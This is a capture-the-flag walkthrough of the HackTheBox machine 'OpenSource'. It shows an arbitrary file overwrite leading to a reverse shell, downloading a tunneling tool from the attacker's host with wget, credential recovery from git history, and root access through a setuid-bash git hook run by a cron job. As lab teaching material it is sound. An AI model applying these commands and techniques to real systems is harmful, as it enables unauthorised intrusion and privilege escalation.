Hello and welcome to my next write up. This will be on Hackthebox box called opensource. 
Let's jump right into it.

First we will start nmap to see which ports are open. 

```
# nmap -T4 -sC -sV -p- 10.10.11.164        
Starting Nmap 7.91 ( https://nmap.org ) at 2022-09-10 08:33 EDT
Nmap scan report for 10.10.11.164 (10.10.11.164)
Host is up (0.061s latency).
Not shown: 65532 closed ports
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Sat, 10 Sep 2022 12:34:25 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Sat, 10 Sep 2022 12:34:25 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
3000/tcp filtered ppp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
------snip-------
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.85 seconds
```

There are two ports open it is 22 which is ssh and 80 which is http and port 3000 which is filtered. Not much we can do with the ssh as the version doesn't have any known vulnerabilities. So let's visit the web page. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Opensource/images/opensource_web.png?raw=true)

We see that there is download button we we're gonna download the source for the page. It's running python so we can take a guess that it 
will be flask application. As this is `.git` let's see which branches are there with the command `git branch`. There are two `dev` and 
`public`. We will switch to dev as it is more likely to leak more things because developers could forget to delete something before posting it online.
In flask web apps there is a `views.py` file which is best place to start looking at the code as it
is convenient because we can see the endpoints this app has. There are four 
routes defined for the app. We can see that there is upcloud endpoint with upload file functionality. The only function that is interesting
and not totally basic is `os.path.join` where we look up vulnerabilities for this function or just documentation we'll find out that
if we specify absolute path it will discard everything else and just use that. Also in `configuration.py` there is `DEBUG=True` so we can
visit endpoint `/uploads/whatever` there is debug page which leaks that the `views.py` is in `/app/app/views.py`

DEBUG IMAGE

Now the easiest way to get shell here is to upload our own malicious `views.py` file and create our own endpoint that will give us reverse shell.
We will use python reverse shell from great repo https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python . Just copy some other route and replace its contents with our shell.

CHANGED VIEWS IMAGE

We will need to catch the upload request in burpsuite to change the name of the file that we are uploading.
U can send the request to repeater and send it from there which is good if something failed or you can just send it from the proxy tab.

CHANGED REQUEST BURP IMAGE

We will set up netcat listener and on visiting http://10.10.11.164/rev or whatever name you defined the endpoint as it will give us reverse shell.
If we try to stabilize the shell it gives us error because there is no bash so let's just use `/bin/sh`

```
/app # ^[[1;8Rpython3 -c 'import pty;pty.spawn("/bin/sh")'
python3 -c 'import pty;pty.spawn("/bin/sh")'
/app # ^[[3;8R^Z
zsh: suspended  nc -lvnp 4242
                                                                                                                                                                                                                                             
┌──(root💀kali)-[~]
└─# stty raw -echo; fg                                                                                                                                                                                                             
[1]  + continued  nc -lvnp 4242

/app # 
```
If we use id it tells us that we are root but i didn't think it would be that easy. In `/` directory do `ls -la` and you will
see `.dockerenv` in there which means that we are in docker container. 

```
/ # ls -la
total 72
drwxr-xr-x    1 root     root          4096 Oct 19 19:46 .
drwxr-xr-x    1 root     root          4096 Oct 19 19:46 ..
-rwxr-xr-x    1 root     root             0 Oct 19 19:46 .dockerenv
--------------snip--------------
```

We remember that there is port 3000 which is filtered. Time to use chisel to create tunnel. We will download it from https://github.com/jpillora/chisel and start python server in the directory in which it is with `# python3 -m http.server 8000`. Then use `wget` in `/tmp` directory `/tmp # wget http://10.10.14.187:8000/chisel`. Now we will run it in server mode on our machine `# ./chisel -p 9001 --reverse` and as client on the 
opensource box `/tmp # ./chisel client localhost:8000 R:3000:172.17.0.1:3000` the ip adress we use here is the one from `ifconfig` 
command but ending with `1` because it is used as ip adress for gateway. Don't forget to do `chmod +x chisel` to make it executable.

There is gitea. There is a sign in but we don't have any credentials. But we have the `.git` we can try to look for credentials there.
`git log ` shows 4 commits. With `git show <commit id>` we will go one by one to see changes made in that commit. And in one of them 
there are credentials. 

GIT SHOW IMAGE

With that login and get in. If we look around we will find `.ssh` with id_rsa key. Now let's copy it into our machine and set rights with
`chmod 600 id_rsa` now we can login with ssh as dev01 and get our flag. `sudo -l` gives us nothing and Linpeas won't help us either. 
Let's try to transfer pspy from our machine to the box to see if there isn't something running that we didn't find. 
It shows us cronjob that is running every minute doing backup of dev01 home directory. We can use this to our advantage
and abuse git hooks. In dev01 home directory is `.git`. .sample files will be skipped. Easiest way is to change `/bin/bash`
to set uid so we can keep its root permission. And change the file permissions to be executable.

```
dev01@opensource:~/.git/hooks$ echo -e '#!/bin/sh\n chmod +s /bin/bash' > pre-commit
dev01@opensource:~/.git/hooks$ chmod +x pre-commit
```

```
dev01@opensource:~/.git/hooks$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Apr 18  2022 /bin/bash
dev01@opensource:~/.git/hooks$ ./bin/bash -p
-bash: ./bin/bash: No such file or directory
dev01@opensource:~/.git/hooks$ /bin/bash -p
bash-4.4# id
uid=1000(dev01) gid=1000(dev01) euid=0(root) egid=0(root) groups=0(root),1000(dev01)
```

After a minute bash becomes setuid and with `/bin/bash -p` we get root shell and can now read the root.txt and our job here 
is finished.

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/THM-Corridor-Write-Up/images/flag.png?raw=true)

Thank you for reading this write up. If you have any suggestions, questions or just want to play CTFs with someone reach me out 
on Twitter or wherever else you can find me.
https://twitter.com/Vojtech1337
